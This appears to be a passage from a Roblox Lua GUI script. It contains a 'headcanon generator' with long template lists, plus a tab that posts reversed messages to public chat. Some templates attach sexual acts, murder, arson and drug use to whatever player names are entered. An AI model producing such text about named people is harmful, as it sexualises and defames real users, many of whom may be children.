	"%s owns an MK-14 EBR.",
	"%s owns an AK-47.",
	"%s owns a draco with a switch.",
	"%s owns a glock with a switch.",
	"%s owns an RPG with a switch.",
	"%s owns a deagle with a switch.",
	"%s owns a P-90 with a switch.",
	"%s owns an MK-14 EBR with a switch.",
	"%s owns an AK-47 with a switch.",
	"%s is emotionally supportive.",
	"%s swears and shouts in russian.",
	"%s owns a gigantic weaponry.",
	"%s's legal guardian was a navy SEAL.",
	"%s was once drafted into war.",
	"%s believes in tarot cards and crystal balls.",
	"%s loves piggyback rides.",
	"%s can breathe underwater for an extended period of time.",
	"%s is a very good cook.",
	"%s is oblivious of everything.",
	"%s fingers themselves.",
	"%s masturbates.",
	"%s is a philosophist.",
	"%s wears striped pajamas and a night cap to bed.",
	"%s uses gang slang when talking.",
	"%s pronounces \"sybau\" as \"psy bow\".",
	"%s can stay doing a handstand for an extended period of time.",
	"%s loves the beach.",
	"%s loves watching the sunset.",
	"%s is an astronomer.",
	"%s cant throw frisbees properly.",
	"%s owns a pet rock.",
	"%s blew up an adoption center and got away with it.",
	"%s lit a school on fire and got away with it.",
	"%s is secretly a catboy.",
	"%s attends furry conventions.",
	"%s is a fast typer.",
	"%s is a slow typer.",
	"%s can pronounce the chemical form of titin if they wanted to.",
	"%s can count to one million if they wanted to.",
	"%s loves buying breakaway glass bottles and throwing them at their friends.",
	"%s donates to charity.",
	"%s is passive agressive.",
	"%s loves being degraded.",
	"%s lets out a slight whimper after sniffling.",
	"%s gets turned on easily.",
	"%s sneezes like a cat.",
	"%s retches when soemone else does.",
	"%s is scared of their own scream.",
	"%s has 2020 humor.",
	"%s can tell creative insults.",
	"%s has light mode on their device and sets its brightness all the way up.",
	"%s says slurs they cant reclaim, and affirms they got a \"pass\" from their friend.",
	"%s hates fruit snacks.",
	"%s blew in from stupid town.",
	"%s is financially responsible.",
	"%s occasionally goes on shopping sprees.",
	"%s owns a dirt bike.",
	"%s can hack anything.",
	"%s climbs up trees when getting chased in order to escape.",
	"%s thinks everyone is secretly against them.",
	"%s can really pack a punch.",
	"%s gets flirted on. a lot.",
	"%s is deathly allergic to wood.",
	"%s is deathly allergic to metal.",
	"%s is deathly allergic to bananas.",
	"%s is deathly allergic to apples.",
	"%s is deathly allergic to ceramic.",
	"%s is deathly allergic to silicone.",
	"%s is deathly allergic to polyester.",
	"%s is deathly allergic to plastic.",
	"%s is deathly allergic to synthetic rubber.",
	"%s is deathly allergic to oranges.",
	"%s is deathly allergic to oreos.",
	"%s is deathly allergic to cabbage.",
	"%s is deathly allergic to lettuce.",
	"%s is deathly allergic to tomatoes.",
	"%s is deathly allergic to bread.",
	"%s is deathly allergic to cucumbers.",
	"%s is deathly allergic to skittles.",
	"%s is deathly allergic to infrared waves.",
	"%s is deathly allergic to ultraviolet waves.",
	"%s is colorblind.",
	"%s cant sleep without them cuddling someone else.",
	"%s swears in front of kids.",
	"%s has an embarrassing old picture of them hanging on their wall.",
	"%s got hit by a bus once.",
	"%s got hit by a car once.",
	"%s got hit by a truck once.",
	"%s starts decorating for a holiday extremely early.",
	"%s is awful with kids.",
	"%s can kill you in an instant when deserved.",
	"%s takes the blame for everything.",
	"%s is oblivous to any and all romantic interest someone may show them.",
	"%s can perform donuts with a car.",
	"%s can perform donuts with a semi truck.",
	"%s can perform donuts with a bus.",
	"%s has a deviantart account.",
	"%s has a roblox account.",
	"%s has a twitter account.",
	"%s has a pinterest account.",
	"%s has a rednote account.",
	"%s has a tumblr account.",
	"%s has a reddit account.",
	"if %s was presented with an intergalactic portal, they would enter it without question.",
	"%s is not allowed to drink energy drinks.",
	"%s is smart but also very stupid.",
	"%s forgets to eat sometimes.",
	"%s crashed a riding lawn mower into their fence.",
	"%s is a horrible liar.",
	"%s is a very good liar.",
	"%s is a simp.",
	"%s cant spell generous.",
	"%s cant spell restaurant.",
	"%s cant spell wednesday.",
	"%s cant spell jewelry.",
	"%s cant spell tongue.",
	"%s cant spell acquire.",
	"%s cant spell colleague.",
	"%s cant spell diarrhea.",
	"%s does a gang sign every time a picture of them is being taken.",
	"%s once wore a sheisty mask.",
	"%s can throw up on command.",
	"%s is very good at soccer.",
	"%s is very good at basketball.",
	"%s is very good at tennis.",
	"%s is very good at badminton.",
	"%s is very good at golf.",
	"%s is very good at soccer.",
	"%s is very good at baseball.",
	"%s sucks at soccer.",
	"%s sucks at basketball.",
	"%s sucks at tennis.",
	"%s sucks at badminton.",
	"%s sucks at golf.",
	"%s sucks at soccer.",
	"%s sucks at baseball.",
	"%s is afraid of doing anything wihtout other peoples permission.",
	"%s writes too much fanfic to be healthy.",
	"%s wears a sweater during hot weather, and wears a t-shirt during cold weather.",
	"%s sleeps naked.",
	"%s is a top.",
	"%s is a bottom.",
	"%s doesnt know how to say theyre sorry.",
	"%s expresses little to no emotion.",
	"%s cant talk properly.",
	"%s doesnt say what they want directly.",
	"%s's favorite color is red.",
	"%s's favorite color is orange.",
	"%s's favorite color is yellow.",
	"%s's favorite color is green.",
	"%s's favorite color is blue.",
	"%s's favorite color is indigo.",
	"%s's favorite color is violet.",
	"%s's least favorite color is red.",
	"%s's least favorite color is orange.",
	"%s's least favorite color is yellow.",
	"%s's least favorite color is green.",
	"%s's least favorite color is blue.",
	"%s's least favorite color is indigo.",
	"%s's least favorite color is violet.",
	"%s has been to prison.",
	"%s spends far too much money on christmas gifts for their friends.",
	"%s is a kleptomaniac.",
	"%s stole a lollipop at the checkout when they were 5 and they still feel guilty about it.",
	"%s has nicknames for everyone.",
	"%s hates disney movies.",
	"%s is very good at walking in platform heels.",
	"%s relies on people for revision notes.",
	"%s sits on the floor with their legs forming a W.",
	"%s roleplays on discord.",
	"%s gets into twitter discourse.",
	"%s plays dandys world.",
	"%s has punched a hole in their wall.",
	"%s has a diary that they write in with a glittery gel pen.",
	"%s was dropped out of a window as a child.",
	"%s cant sit on a chair properly.",
	"%s is afraid to close their eyes in the shower.",
	"%s could easily survive the hunger games.",
	"%s uses the word \"like\" as a comma.",
	"%s can turn a chromebook into a bomb.",
	"%s has chronic nightmares.",
	"%s reads ao3.",
	"%s is an ao3 writer.",
	"%s knows the lyrics to every hatsune miku song by heart.",
	"%s cringes at their middle school yearbook photos.",
	"%s will go feral. watch out.",
	"%s is physically incapable of writing anything original.",
	"%s location was unknown during 9/11.",
	"%s is secretly in love with their mortal enemy.",
	"%s before a fight, always has the cowboy standoff music in their head playing.",
	"%s is not to be trusted with a sharp object.",
	"%s has done karaoke drunk with friends.",
	"%s is mentioned briefly in some type of major media, but nobody ever notices.",
	"%s has been to the hospital more than the average person.",
	"%s has a little garden that they occasionally work on.",
	"%s does intricate and expensive cosplays.",
	"%s is a discord moderator.",
	"%s is high, at all times.",
	"%s blasts phonk in the middle of the night.",
	"%s listens to nightcore versions of all the popular songs, instead of the original ones.",
	"%s listens to femtanyl way too much.",
	"%s is a pathological liar.",
	"%s is a complusive liar.",
}

local hcs_two = {
	"%s had sex with %s, but they both keep it a secret.",
	"%s killed %s's family.",
	"%s puppyplays with %s.",
	"%s and %s were forced to kiss each other in 7th grade by their classmates.",
	"if someone were to talk shit about %s, %s would call an orbital strike upon them.",
	"%s teases %s for being short.",
	"%s and %s sleeps while calling each other.",
	"%s gave %s about 50 mental disorders in the span of 4 days.",
	"%s and %s always stays near each other.",
	"%s and %s argue about their music tastes.",
	"%s would not hesitate to french kiss the life out of %s.",
	"%s dry humps %s on a daily basis.",
	"%s is always in %s's dreams.",
	"%s is always in %s's nightmares.",
	"%s cant go 20 seconds without %s staying approximately 10 meters in range near them.",
	"%s hates %s. a lot.",
	"when %s and %s sleep together, they both end up in very awkward sleeping positions.",
	"%s toilet papered %s's house as an april fools joke.",
	"%s likes %s. a lot.",
	"%s occasionally flirts with %s.",
	"%s copies everything %s does.",
	"%s and %s are the mere definition of \"dumb\" and \"dumber\".",
	"%s loves being degraded by %s.",
	"%s tops %s.",
	"%s killed %s.",
	"%s accidentally shot %s in the leg in a hunting accident.",
	"%s has a video clip of %s sleeping to mommy asmr.",
	"%s executes deadly chromebook combinations on %s's school chromebook.",
	"when bored in public, %s and %s perform a scarily accurate fent fold next to each other as a silly joke.",
	"%s and %s are in a very complicated love-hate relationship with each other.",
	"%s constantly terrorizes %s with a stuffed animal.",
	"%s and %s are sworn enemies, but people constantly ship them.",
	"%s terrorizes %s for a living.",
	"%s constantly teases %s, but would start a war if anyone else tried.",
	"%s always drags %s into ridiculous bets they somehow win.",
	"%s and %s accidentally started a rumor that theyre dating. neither denied it.",
	"%s and %s text each other with brainrot and internet slang exclusively.",
	"%s claims they hate %s's cooking but always asks for seconds.",
	"%s and %s once tried to learn a tiktok dance and destroyed a lamp.",
	"%s calls %s at 3am to discuss unhinged conspiracy theories.",
	"%s and %s co-own a pet snail they treat like royalty.",
	"%s writes poetry about %s and pretends its for class.",
	"%s and %s prank each other with fake love letters regularly.",
	"%s and %s once played a board game for 7 hours and still argue about who won.",
	"%s keeps pretending not to know %s's birthday.",
	"%s and %s tried to switch identities for a day. it worked way too well.",
	"%s and %s argue over fictional ships like their lives depend on it.",
	"%s saved %s's life once and will never let them forget it.",
	"%s and %s made a secret handshake with 12 steps and a dramatic pose.",
	"%s and %s once pretended to be ghosts to scare a tour group.",
	"%s and %s once tried to bake a cake but accidentally used salt instead of sugar and still ate it out of spite.",
	"%s keeps stealing %s's left sock just to mess with them.",
	"%s and %s once got lost in ikea for three hours and now refuse to go back.",
	"%s writes dramatic fanfiction about %s's mundane life and reads it aloud at parties.",
	"%s keeps a list of %s's weirdest quotes and plans to publish them someday.",
	"%s sends %s cryptic postcards from their own city to confuse them.",
	"%s and %s have an elaborate system of code words for when theyre bored in public.",
	"%s convinced %s that pigeons are government drones and now they cant unsee it.",
	"%s and %s once spent an entire road trip debating whether a hotdog is a sandwich.",
	"%s keeps \"accidentally\" setting %s's netflix profile to kids mode.",
	"%s and %s have a shared soundcloud playlist thats just full of phonk music.",
	"%s once replaced all of %s's desktop icons with pictures of josh hutcherson.",
	"%s and %s have a competition to see who can sneak the weirdest item into the others bag.",
	"%s convinced %s that theyre allergic to a completely normal food just to mess with them.",
	"%s keeps sending %s anonymous gifts signed \"your secret admirer\" and its obviously them.",
	"%s and %s argue for hours about which of their favorite songs is better.",
	"%s and %s bake cookies together but end up starting a flour fight.",
	"%s keeps stealing %s's hoodies and denying it even though theyre wearing one.",
	"%s and %s have an ongoing prank war that has escalated to ridiculous proportions.",
	"%s and %s always end up talking in weird accents when theyre together.",
	"%s and %s get way too competitive playing board games.",
	"%s and %s pretend to be married at restaurants to get free dessert.",
	"%s always drags %s into their spontaneous dance parties.",
	"%s and %s have a playlist of songs that remind them of each other.",
	"%s and %s have a jar where they write down future adventure ideas together.",
	"%s and %s keep getting mistaken for siblings and just roll with it.",
	"%s and %s have a tradition of making breakfast for each other on sundays.",
	"%s loves to dramatically read bedtime stories to %s like a soap opera.",
	"%s and %s built a pillow fort and refuse to let anyone else in.",
	"%s and %s have an annual snowball fight that gets very intense.",
	"%s and %s are always up for late night fast food runs together.",
	"%s and %s get into debates about which animals would make the best roommates.",
	"%s and %s have a shared playlist they keep adding random songs to.",
	"%s and %s act like secret agents when theyre in the grocery store together.",
	"%s and %s always go to haunted houses together even though theyre both scared.",
	"%s made %s a crown out of flowers and insists they wear it like royalty.",
	"%s and %s try out new hobbies together and usually fail hilariously.",
	"%s and %s have matching keychains and swear its not on purpose.",
	"%s always makes up new nicknames for %s just to see their reaction.",
	"%s and %s have an ongoing debate about pineapple on pizza.",
	"%s and %s have an elaborate story about how they met that they tell everyone.",
	"%s always challenges %s to race them home, even if its only a block away.",
	"%s and %s have a shared love for terrible puns and make them constantly.",
	"%s and %s always sing duets at karaoke night, no matter the song.",
	"%s and %s have matching water bottles they refuse to lose.",
	"%s and %s once swapped clothes for a day just to confuse everyone.",
	"%s and %s always try to guess what the other is thinking (and theyre usually wrong).",
	"%s and %s once tried to make a fancy dinner but ended up ordering takeout instead.",
}

local lastIndex_one = nil
local lastIndex_two = nil

function ghc(name1, name2)
	if name1 and name1:match("%S") and (not name2 or not name2:match("%S")) then
		local index
		repeat
			index = math.random(1, #hcs_one)
		until index ~= lastIndex_one or #hcs_one == 1

		lastIndex_one = index
		return string.format(hcs_one[index], name1)

	elseif name1 and name1:match("%S") and name2 and name2:match("%S") then
		local index
		repeat
			index = math.random(1, #hcs_two)
		until index ~= lastIndex_two or #hcs_two == 1

		lastIndex_two = index
		return string.format(hcs_two[index], name1, name2)
	end
end

uwu["generate headcanon"].MouseButton1Click:Connect(function()
	playclicksound()
	local name1 = uwu["headcanon generator input"].Text
	local name2 = uwu["headcanon generator input 2"].Text
	local outputBox = uwu["headcanon generator output"]

	if name1 and name1:match("%S") then
		local result = ghc(name1, name2)
		outputBox.Text = result or "..."
	else
		outputBox.Text = "..."
	end
end)

-------------------------------------------------------------------------------------------------------------------------------

uwu["headcanon generator tab block main frame"].Size = UDim2.new(0, 476, 0, 168)
uwu["headcanon generator tab block main frame"].Position = UDim2.new(0, 0, 1, 1)

uwu["headcanon generator tab block main frame"].BackgroundColor3 = uwu["default background color"]

uwu["headcanon generator tab block main frame"].BorderColor3 = uwu["default border color"]
uwu["headcanon generator tab block main frame"].BorderSizePixel = 1
uwu["headcanon generator tab block main frame"].BackgroundTransparency = 1

uwu["headcanon generator tab block main frame"].Parent = uwu["headcanon generator tab top bar"]
uwu["headcanon generator tab block main frame"].ZIndex = 204
uwu["headcanon generator tab block main frame"].Visible = false

-------------------------------------------------------------------------------------------------------------------------------

uwu["headcanon generator tab block all"].Size = UDim2.new(0, 446, 0, 170)
uwu["headcanon generator tab block all"].Position = UDim2.new(0, 0, 0, 0)

uwu["headcanon generator tab block all"].BackgroundColor3 = uwu["default background color"]

uwu["headcanon generator tab block all"].BorderColor3 = uwu["default border color"]
uwu["headcanon generator tab block all"].BorderSizePixel = 1
uwu["headcanon generator tab block all"].BackgroundTransparency = 0

uwu["headcanon generator tab block all"].Parent = uwu["headcanon generator tab top bar"]
uwu["headcanon generator tab block all"].ZIndex = 205
uwu["headcanon generator tab block all"].Visible = false

-------------------------------------------------------------------------------------------------------------------------------

uwu["message reverser tab top bar"].Size = UDim2.new(0, 345, 0, 26)

uwu["message reverser tab top bar"].BackgroundColor3 = uwu["default background color"]

uwu["message reverser tab top bar"].BorderColor3 = uwu["default border color"]
uwu["message reverser tab top bar"].BorderSizePixel = 1

uwu["message reverser tab top bar"].TextColor3 = uwu["default border color"]
uwu["message reverser tab top bar"].Font = Enum.Font.RobotoMono
uwu["message reverser tab top bar"].TextSize = 15
uwu["message reverser tab top bar"].TextScaled = false
uwu["message reverser tab top bar"].Text = " message reverser.lua o.o"
uwu["message reverser tab top bar"].TextXAlignment = Enum.TextXAlignment.Left
uwu["message reverser tab top bar"].TextYAlignment = Enum.TextYAlignment.Center

uwu["message reverser top bar text padding"] = Instance.new("UIPadding")
uwu["message reverser top bar text padding"].PaddingLeft = UDim.new(0, 0)
uwu["message reverser top bar text padding"].PaddingRight = UDim.new(0, 0)
uwu["message reverser top bar text padding"].Parent = uwu["message reverser tab top bar"]

uwu["message reverser tab top bar"].Parent = uwu["screen gui"]
uwu["message reverser tab top bar"].ZIndex = 703
uwu["message reverser tab top bar"].Visible = false

function dragmsgrevtabtopbar()
	local frame = uwu["message reverser tab top bar"]
	local dragToggle 	
	local dragSpeed = 0.25
	local dragStart 	
	local startPos 

	local function updatebuttoninput(input)
		local delta = input.Position - dragStart
		local position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X,
			startPos.Y.Scale, startPos.Y.Offset + delta.Y)
		uwu["tween service"]:Create(frame, TweenInfo.new(dragSpeed), {Position = position}):Play()
	end

	frame.InputBegan:Connect(function(input)
		if (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) then 
			dragToggle = true
			dragStart = input.Position
			startPos = frame.Position
			input.Changed:Connect(function()
				if input.UserInputState == Enum.UserInputState.End then
					dragToggle = false
				end
			end)
		end
	end)

	uwu["user input service"].InputChanged:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
			if dragToggle then
				updatebuttoninput(input)
			end
		end
	end)
end

dragmsgrevtabtopbar()

-------------------------------------------------------------------------------------------------------------------------------

uwu["message reverser tab top bar close button"].Size = UDim2.new(0, 18, 0, 18)
uwu["message reverser tab top bar close button"].Position = UDim2.new(0, 323, 0, 4.7)

uwu["message reverser tab top bar close button"].BackgroundColor3 = uwu["default background color"]

uwu["message reverser tab top bar close button"].BorderColor3 = uwu["default border color"]
uwu["message reverser tab top bar close button"].BorderSizePixel = 1

uwu["message reverser tab top bar close button"].TextColor3 = uwu["default border color"]
uwu["message reverser tab top bar close button"].Font = Enum.Font.RobotoMono
uwu["message reverser tab top bar close button"].TextSize = 16
uwu["message reverser tab top bar close button"].TextScaled = false
uwu["message reverser tab top bar close button"].Text = "X"
uwu["message reverser tab top bar close button"].TextXAlignment = Enum.TextXAlignment.Center
uwu["message reverser tab top bar close button"].TextYAlignment = Enum.TextYAlignment.Center

uwu["message reverser tab top bar close button"].Parent = uwu["message reverser tab top bar"]
uwu["message reverser tab top bar close button"].ZIndex = 704

uwu["message reverser tab top bar close button text padding"] = Instance.new("UIPadding")
uwu["message reverser tab top bar close button text padding"].PaddingTop = UDim.new(0, -1)
uwu["message reverser tab top bar close button text padding"].Parent = uwu["message reverser tab top bar close button"]

uwu["message reverser tab top bar close button"].MouseButton1Click:Connect(function()
	if not msgrevcanminimize then return end
	msgrevtabopen = false
	msgrevtabminimized = false
	playclicksound()
	uwu["message reverser tab top bar"].Visible = false
	repos(uwu["message reverser tab top bar"], 0, 345, 168 + 26)
end)

-------------------------------------------------------------------------------------------------------------------------------

uwu["message reverser tab top bar minimize button"].Size = UDim2.new(0, 18, 0, 18)
uwu["message reverser tab top bar minimize button"].Position = UDim2.new(0, 299, 0, 4.7)

uwu["message reverser tab top bar minimize button"].BackgroundColor3 = uwu["default background color"]

uwu["message reverser tab top bar minimize button"].BorderColor3 = uwu["default border color"]
uwu["message reverser tab top bar minimize button"].BorderSizePixel = 1

uwu["message reverser tab top bar minimize button"].TextColor3 = uwu["default border color"]
uwu["message reverser tab top bar minimize button"].Font = Enum.Font.RobotoMono
uwu["message reverser tab top bar minimize button"].TextSize = 16
uwu["message reverser tab top bar minimize button"].TextScaled = false
uwu["message reverser tab top bar minimize button"].Visible = true
uwu["message reverser tab top bar minimize button"].Text = "-"
uwu["message reverser tab top bar minimize button"].TextXAlignment = Enum.TextXAlignment.Center
uwu["message reverser tab top bar minimize button"].TextYAlignment = Enum.TextYAlignment.Center

uwu["message reverser tab top bar minimize button"].Parent = uwu["message reverser tab top bar"]
uwu["message reverser tab top bar minimize button"].ZIndex = 704

uwu["message reverser tab top bar minimize button text padding"] = Instance.new("UIPadding")
uwu["message reverser tab top bar minimize button text padding"].PaddingTop = UDim.new(0, -2)
uwu["message reverser tab top bar minimize button text padding"].Parent = uwu["message reverser tab top bar minimize button"]

msgrevtabminimized = false
msgrevcanminimize = true

uwu["message reverser tab top bar minimize button"].MouseButton1Click:Connect(function()
	if not msgrevcanminimize then return end
	spawn(playclicksound)
	msgrevcanminimize = false

	msgrevtabminimized = not msgrevtabminimized

	if msgrevtabminimized then
		uwu["message reverser tab top bar minimize button"].Text = "+"
		uwu["message reverser tab block main frame"].Visible = true

		local fadeTween = fade(uwu["message reverser tab block main frame"], 0, 0.2)
		fadeTween.Completed:Wait()
		uwu["message reverser tab main frame 1"].Visible = false

		local tween = tweenSizePosition(
			uwu["message reverser tab block main frame"],
			UDim2.new(0, 345, 0, 0),
			UDim2.new(0, 0, 1, 1),
			0.5
		)
		tween.Completed:Wait()

		msgrevtabreallyminimized = true
		uwu["message reverser tab block main frame"].Visible = false
	else
		uwu["message reverser tab top bar minimize button"].Text = "-"
		uwu["message reverser tab block main frame"].Visible = true

		local tween = tweenSizePosition(
			uwu["message reverser tab block main frame"],
			UDim2.new(0, 345, 0, 141),
			UDim2.new(0, 0, 1, 1),
			0.5
		)
		tween.Completed:Wait()
		uwu["message reverser tab main frame 1"].Visible = true

		local fadeTween = fade(uwu["message reverser tab block main frame"], 1, 0.2)
		fadeTween.Completed:Wait()

		msgrevtabreallyminimized = false
		uwu["message reverser tab block main frame"].Visible = false
	end

	msgrevcanminimize = true
end)

-------------------------------------------------------------------------------------------------------------------------------

uwu["message reverser tab top bar reposition button"].Size = UDim2.new(0, 18, 0, 18)
uwu["message reverser tab top bar reposition button"].Position = UDim2.new(0, 275, 0, 4.7)

uwu["message reverser tab top bar reposition button"].BackgroundColor3 = uwu["default background color"]

uwu["message reverser tab top bar reposition button"].BorderColor3 = uwu["default border color"]
uwu["message reverser tab top bar reposition button"].BorderSizePixel = 1

uwu["message reverser tab top bar reposition button"].TextColor3 = uwu["default border color"]
uwu["message reverser tab top bar reposition button"].Font = Enum.Font.RobotoMono
uwu["message reverser tab top bar reposition button"].TextSize = 16
uwu["message reverser tab top bar reposition button"].TextScaled = false
uwu["message reverser tab top bar reposition button"].Text = "R"
uwu["message reverser tab top bar reposition button"].TextXAlignment = Enum.TextXAlignment.Center
uwu["message reverser tab top bar reposition button"].TextYAlignment = Enum.TextYAlignment.Center

uwu["message reverser tab top bar reposition button"].Parent = uwu["message reverser tab top bar"]
uwu["message reverser tab top bar reposition button"].ZIndex = 704

uwu["message reverser tab top bar reposition button text padding"] = Instance.new("UIPadding")
uwu["message reverser tab top bar reposition button text padding"].PaddingTop = UDim.new(0, -1)
uwu["message reverser tab top bar reposition button text padding"].Parent = uwu["message reverser tab top bar reposition button"]

uwu["message reverser tab top bar reposition button"].MouseButton1Click:Connect(function()
	playclicksound()
	repos(uwu["message reverser tab top bar"], 0.5, 345, 168 + 26)
end)

-------------------------------------------------------------------------------------------------------------------------------

uwu["message reverser tab main frame 1"].Size = UDim2.new(0, 345, 0, 142)
uwu["message reverser tab main frame 1"].Position = UDim2.new(0, 0, 1, 0)

uwu["message reverser tab main frame 1"].BackgroundColor3 = uwu["default background color"]

uwu["message reverser tab main frame 1"].BorderColor3 = uwu["default border color"]
uwu["message reverser tab main frame 1"].BorderSizePixel = 1

uwu["message reverser tab main frame 1"].Parent = uwu["message reverser tab top bar"]
uwu["message reverser tab main frame 1"].ZIndex = 702

-------------------------------------------------------------------------------------------------------------------------------

uwu["message reverser input"].Size = UDim2.new(0, 337, 0, 87)
uwu["message reverser input"].Position = UDim2.new(0, 4, 0, 5)

uwu["message reverser input"].BackgroundColor3 = uwu["default background color"]

uwu["message reverser input"].BorderColor3 = uwu["default border color"]
uwu["message reverser input"].BorderSizePixel = 1

uwu["message reverser input"].Parent = uwu["message reverser tab main frame 1"]
uwu["message reverser input"].ZIndex = 703

uwu["message reverser input"].Font = Enum.Font.RobotoMono
uwu["message reverser input"].TextColor3 = Color3.new(1, 1, 1)
uwu["message reverser input"].TextSize = 15
uwu["message reverser input"].Text = ""
uwu["message reverser input"].PlaceholderText = "input message"
uwu["message reverser input"].PlaceholderColor3 = uwu["default 1/2 color"]
uwu["message reverser input"].TextWrapped = true
uwu["message reverser input"].TextXAlignment = Enum.TextXAlignment.Left
uwu["message reverser input"].TextYAlignment = Enum.TextYAlignment.Top
uwu["message reverser input"].ClearTextOnFocus = false
uwu["message reverser input"].ClipsDescendants = true

uwu["message reverser input max chars"] = 200

uwu["message reverser input"]:GetPropertyChangedSignal("Text"):Connect(function()
	local inputBox = uwu["message reverser input"]
	local maxChars = uwu["message reverser input max chars"]

	if #inputBox.Text > maxChars then
		inputBox.Text = inputBox.Text:sub(1, maxChars)
	end
end)

uwu["message reverser input text padding"] = Instance.new("UIPadding")
uwu["message reverser input text padding"].PaddingBottom = UDim.new(0, 4)
uwu["message reverser input text padding"].PaddingLeft = UDim.new(0, 4)
uwu["message reverser input text padding"].PaddingRight = UDim.new(0, 4)
uwu["message reverser input text padding"].PaddingTop = UDim.new(0, 4)
uwu["message reverser input text padding"].Parent = uwu["message reverser input"]

uwu["reverse message"].Size = UDim2.new(0, 166, 0, 41)
uwu["reverse message"].Position = UDim2.new(0, 4, 0, 97)

uwu["reverse message"].BackgroundColor3 = uwu["default background color"]

uwu["reverse message"].BorderColor3 = uwu["default border color"]
uwu["reverse message"].BorderSizePixel = 1

uwu["reverse message"].Parent = uwu["message reverser tab main frame 1"]
uwu["reverse message"].ZIndex = 703

uwu["reverse message"].Font = Enum.Font.RobotoMono
uwu["reverse message"].TextColor3 = Color3.new(1, 1, 1)
uwu["reverse message"].TextSize = 15
uwu["reverse message"].Text = "send reversed"
uwu["reverse message"].TextWrapped = true
uwu["reverse message"].TextXAlignment = Enum.TextXAlignment.Center
uwu["reverse message"].TextYAlignment = Enum.TextYAlignment.Center
uwu["reverse message"].ClipsDescendants = true

uwu["reverse message text padding"] = Instance.new("UIPadding")
uwu["reverse message text padding"].PaddingBottom = UDim.new(0, 0)
uwu["reverse message text padding"].Parent = uwu["reverse message"]

uwu["clear message reverser input"].Size = UDim2.new(0, 166, 0, 41)
uwu["clear message reverser input"].Position = UDim2.new(0, 175, 0, 97)

uwu["clear message reverser input"].BackgroundColor3 = uwu["default background color"]

uwu["clear message reverser input"].BorderColor3 = uwu["default border color"]
uwu["clear message reverser input"].BorderSizePixel = 1

uwu["clear message reverser input"].Parent = uwu["message reverser tab main frame 1"]
uwu["clear message reverser input"].ZIndex = 703

uwu["clear message reverser input"].Font = Enum.Font.RobotoMono
uwu["clear message reverser input"].TextColor3 = Color3.new(1, 1, 1)
uwu["clear message reverser input"].TextSize = 15
uwu["clear message reverser input"].Text = "clear"
uwu["clear message reverser input"].TextWrapped = true
uwu["clear message reverser input"].TextXAlignment = Enum.TextXAlignment.Center
uwu["clear message reverser input"].TextYAlignment = Enum.TextYAlignment.Center
uwu["clear message reverser input"].ClipsDescendants = true

uwu["clear message reverser input text padding"] = Instance.new("UIPadding")
uwu["clear message reverser input text padding"].PaddingBottom = UDim.new(0, 0)
uwu["clear message reverser input text padding"].Parent = uwu["clear message reverser input"]

uwu["clear message reverser input"].MouseButton1Click:Connect(function()
	playclicksound()
	uwu["message reverser input"].Text = ""
end)

uwu["reverse message"].MouseButton1Click:Connect(function()
	playclicksound()
	local inputBox = uwu["message reverser input"]
	local reversedText = inputBox.Text:reverse()

	if reversedText == "" then return end

	if uwu["text chat service"].ChatVersion == Enum.ChatVersion.TextChatService then
		local textChannel = uwu["text chat service"]:FindFirstChild("TextChannels")
		if textChannel and textChannel:FindFirstChild("RBXGeneral") then
			textChannel.RBXGeneral:SendAsync(reversedText)
		end
	else
		local chatEvent = uwu["replicated storage"]:FindFirstChild("DefaultChatSystemChatEvents")
		if chatEvent and chatEvent:FindFirstChild("SayMessageRequest") then
			chatEvent.SayMessageRequest:FireServer(reversedText, "All")
		end
	end
end)

uwu["message reverser input"].FocusLost:Connect(function(enterPressed)
	if enterPressed then
		local inputBox = uwu["message reverser input"]
		local reversedText = inputBox.Text:reverse()

		if reversedText == "" then return end

		if uwu["text chat service"].ChatVersion == Enum.ChatVersion.TextChatService then
			local textChannel = uwu["text chat service"]:FindFirstChild("TextChannels")
			if textChannel and textChannel:FindFirstChild("RBXGeneral") then
				textChannel.RBXGeneral:SendAsync(reversedText)
				uwu["message reverser input"].Text = ""
			end
		else
			local chatEvent = uwu["replicated storage"]:FindFirstChild("DefaultChatSystemChatEvents")
			if chatEvent and chatEvent:FindFirstChild("SayMessageRequest") then
				chatEvent.SayMessageRequest:FireServer(reversedText, "All")
				uwu["message reverser input"].Text = ""
			end
		end
	end
end)

-------------------------------------------------------------------------------------------------------------------------------

uwu["message reverser tab block main frame"].Size = UDim2.new(0, 375, 0, 168)
uwu["message reverser tab block main frame"].Position = UDim2.new(0, 0, 1, 1)

uwu["message reverser tab block main frame"].BackgroundColor3 = uwu["default background color"]

uwu["message reverser tab block main frame"].BorderColor3 = uwu["default border color"]
uwu["message reverser tab block main frame"].BorderSizePixel = 1
uwu["message reverser tab block main frame"].BackgroundTransparency = 1

uwu["message reverser tab block main frame"].Parent = uwu["message reverser tab top bar"]
uwu["message reverser tab block main frame"].ZIndex = 704
uwu["message reverser tab block main frame"].Visible = false

-------------------------------------------------------------------------------------------------------------------------------

uwu["message reverser tab block all"].Size = UDim2.new(0, 345, 0, 170)
uwu["message reverser tab block all"].Position = UDim2.new(0, 0, 0, 0)

uwu["message reverser tab block all"].BackgroundColor3 = uwu["default background color"]

uwu["message reverser tab block all"].BorderColor3 = uwu["default border color"]
uwu["message reverser tab block all"].BorderSizePixel = 1
uwu["message reverser tab block all"].BackgroundTransparency = 0

uwu["message reverser tab block all"].Parent = uwu["message reverser tab top bar"]
uwu["message reverser tab block all"].ZIndex = 705
uwu["message reverser tab block all"].Visible = false

-------------------------------------------------------------------------------------------------------------------------------

uwu["k12 encoder and decoder tab top bar"].Size = UDim2.new(0, 545, 0, 26)

uwu["k12 encoder and decoder tab top bar"].BackgroundColor3 = uwu["default background color"]

uwu["k12 encoder and decoder tab top bar"].BorderColor3 = uwu["default border color"]
uwu["k12 encoder and decoder tab top bar"].BorderSizePixel = 1

uwu["k12 encoder and decoder tab top bar"].TextColor3 = uwu["default border color"]
uwu["k12 encoder and decoder tab top bar"].Font = Enum.Font.RobotoMono
uwu["k12 encoder and decoder tab top bar"].TextSize = 15
uwu["k12 encoder and decoder tab top bar"].TextScaled = false
uwu["k12 encoder and decoder tab top bar"].Text = " k12 encoder and decoder.lua o.o"
uwu["k12 encoder and decoder tab top bar"].TextXAlignment = Enum.TextXAlignment.Left
uwu["k12 encoder and decoder tab top bar"].TextYAlignment = Enum.TextYAlignment.Center

